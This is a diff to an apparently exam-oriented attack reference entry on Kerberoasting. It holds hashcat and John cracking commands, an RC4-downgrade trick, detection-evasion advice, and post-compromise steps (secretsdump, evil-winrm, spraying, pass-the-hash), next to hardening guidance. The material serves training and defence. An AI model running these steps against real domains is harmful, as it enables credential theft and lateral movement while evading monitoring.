@@ -26,7 +26,7 @@
     "T1558.003"
   ],
   "exam": "exam-ok",
-  "notes": "=== WHY OFFLINE CRACKING IS POWERFUL HERE ===\nOnce you have the TGS hash, cracking is purely local \u2014 no network traffic,\nno lockout counter increments, no authentication events. You're brute-forcing\nthe service account's password against the ticket encryption, which is\nequivalent to guessing the NT hash that encrypted it.\n\n=== HASH MODES ===\n  13100 = $krb5tgs$23$  \u2014 RC4 (ARCFOUR-HMAC-MD5, etype 23) \u2014 FAST\n  19700 = $krb5tgs$18$  \u2014 AES256-CTS-HMAC-SHA1-96, etype 18 \u2014 SLOW\n  Identify mode: look at the hash header:\n    $krb5tgs$23$*user$domain$... \u2192 mode 13100\n    $krb5tgs$18$*user$domain$... \u2192 mode 19700\n\n=== CRACKING STRATEGY ===\n1. Start with rockyou: hashcat -m 13100 hash.txt rockyou.txt\n2. Add rules:          hashcat -m 13100 hash.txt rockyou.txt -r best64.rule\n3. Corporate patterns: hashcat -m 13100 hash.txt -a 3 ?u?l?l?l?l?l?d?d\n4. Larger wordlists:   hashcat -m 13100 hash.txt /opt/wordlists/weakpass_3a.txt\n\n=== AES TICKETS \u2014 WHAT TO DO ===\nAES tickets (mode 19700) are much slower. Options:\n  1. If you have GenericWrite on the account, you can change its\n     SupportedEncryptionTypes attribute to allow RC4 \u2014 then re-roast\n  2. With Rubeus: /rc4opsec flag attempts RC4 downgrade request\n  3. Just run it with GPU acceleration \u2014 still feasible for common passwords\n\n=== AFTER CRACKING ===\n  Verify:  crackmapexec smb <dc_ip> -u <svc_user> -p <cracked_pw>\n  If DA:   Run secretsdump / evil-winrm immediately\n  Spray:   Service accounts often reuse passwords across systems\n  PTH:     Get NT hash via secretsdump then do pass-the-hash attacks Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).\n\n=== KIRBI \u2192 HASHABLE FORMAT ===\nIf you have a .kirbi file (from Rubeus /export or mimikatz kerberos::list /export):\n  python2.7 kirbi2john.py ticket.kirbi > ticket.john\n  # May need sed to fix header for hashcat: s/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/\n  hashcat -m 13100 ticket.john /usr/share/wordlists/rockyou.txt",
+  "notes": "=== WHY OFFLINE CRACKING IS POWERFUL HERE ===\nOnce you have the TGS hash, cracking is purely local — no network traffic,\nno lockout counter increments, no authentication events. You're brute-forcing\nthe service account's password against the ticket encryption, which is\nequivalent to guessing the NT hash that encrypted it.\n\n=== HASH MODES ===\n  13100 = $krb5tgs$23$  — RC4 (ARCFOUR-HMAC-MD5, etype 23) — FAST\n  19700 = $krb5tgs$18$  — AES256-CTS-HMAC-SHA1-96, etype 18 — SLOW\n  Identify mode: look at the hash header:\n    $krb5tgs$23$*user$domain$... → mode 13100\n    $krb5tgs$18$*user$domain$... → mode 19700\n\n=== CRACKING STRATEGY ===\n1. Start with rockyou: hashcat -m 13100 hash.txt rockyou.txt\n2. Add rules:          hashcat -m 13100 hash.txt rockyou.txt -r best64.rule\n3. Corporate patterns: hashcat -m 13100 hash.txt -a 3 ?u?l?l?l?l?l?d?d\n4. Larger wordlists:   hashcat -m 13100 hash.txt /opt/wordlists/weakpass_3a.txt\n\n=== AES TICKETS — WHAT TO DO ===\nAES tickets (mode 19700) are much slower. Options:\n  1. If you have GenericWrite on the account, you can change its\n     SupportedEncryptionTypes attribute to allow RC4 — then re-roast\n  2. With Rubeus: /rc4opsec flag attempts RC4 downgrade request\n  3. Just run it with GPU acceleration — still feasible for common passwords\n\n=== AFTER CRACKING ===\n  Verify:  crackmapexec smb <dc_ip> -u <svc_user> -p <cracked_pw>\n  If DA:   Run secretsdump / evil-winrm immediately\n  Spray:   Service accounts often reuse passwords across systems\n  PTH:     Get NT hash via secretsdump then do pass-the-hash attacks Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).\n\n=== KIRBI → HASHABLE FORMAT ===\nIf you have a .kirbi file (from Rubeus /export or mimikatz kerberos::list /export):\n  python2.7 kirbi2john.py ticket.kirbi > ticket.john\n  # May need sed to fix header for hashcat: s/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/\n  hashcat -m 13100 ticket.john /usr/share/wordlists/rockyou.txt",
   "examples": [
     {
       "label": "Crack RC4 ticket (mode 13100)",
@@ -49,7 +49,7 @@
       "command": "sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!"
     },
     {
-      "label": "Ch22 \u2014 crack TGS-REP RC4 hash with best64 rules (PEN-200 pattern, mode 13100)",
+      "label": "Ch22 — crack TGS-REP RC4 hash with best64 rules (PEN-200 pattern, mode 13100)",
       "command": "sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"
     },
     {
@@ -91,11 +91,26 @@
       "HTB M13",
       "MITRE T1110.002"
     ],
-    "misconfiguration": "Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords \u2014 or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).",
-    "vulnerable_config": "# Service account set up manually with a weak password + SPN\n# Attacker can find these with:\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet\n\n# Bad state \u2014 password set 4 years ago, RC4 permitted:\n# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433\n# RC4 (0x17) requested in TGS ticket \u2014 short hash, GPU-crackable\n\n# Confirming RC4 is available:\nGet-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes\n# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)",
-    "secure_config": "# Fix 1 \u2014 Use Group Managed Service Accounts (gMSA): 240-char random passwords,\n# auto-rotated by AD, no human ever knows the password\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \\\n    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'\nInstall-ADServiceAccount gmsa_sql\n\n# Fix 2 \u2014 For legacy accounts that must keep SPNs:\n# Set a 100+ character random password (AD max is 127 chars):\n$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)\nSet-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)\n\n# Fix 3 \u2014 Disable RC4, require AES-only:\nSet-ADUser svc_sql -KerberosEncryptionType AES128,AES256\n# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)"
+    "misconfiguration": "Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords — or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).",
+    "vulnerable_config": "# Service account set up manually with a weak password + SPN\n# Attacker can find these with:\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet\n\n# Bad state — password set 4 years ago, RC4 permitted:\n# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433\n# RC4 (0x17) requested in TGS ticket — short hash, GPU-crackable\n\n# Confirming RC4 is available:\nGet-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes\n# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)",
+    "secure_config": "# Fix 1 — Use Group Managed Service Accounts (gMSA): 240-char random passwords,\n# auto-rotated by AD, no human ever knows the password\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \\\n    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'\nInstall-ADServiceAccount gmsa_sql\n\n# Fix 2 — For legacy accounts that must keep SPNs:\n# Set a 100+ character random password (AD max is 127 chars):\n$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)\nSet-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)\n\n# Fix 3 — Disable RC4, require AES-only:\nSet-ADUser svc_sql -KerberosEncryptionType AES128,AES256\n# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)",
+    "evasion": "Use /rc4opsec (skip AES-only accounts, request only downgradable tickets), roast a few high-value SPNs rather than all, and crack offline; avoid mass TGS requests that spike 4769."
   },
   "tools": [
     "hashcat"
+  ],
+  "variations": [
+    {
+      "label": "John the Ripper",
+      "command": "john --format=krb5tgs --wordlist=<wordlist> <hashfile>"
+    },
+    {
+      "label": "hashcat with rules",
+      "command": "hashcat -m 13100 <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule"
+    },
+    {
+      "label": "Show cracked",
+      "command": "hashcat -m 13100 <hashfile> --show"
+    }
   ]
 }
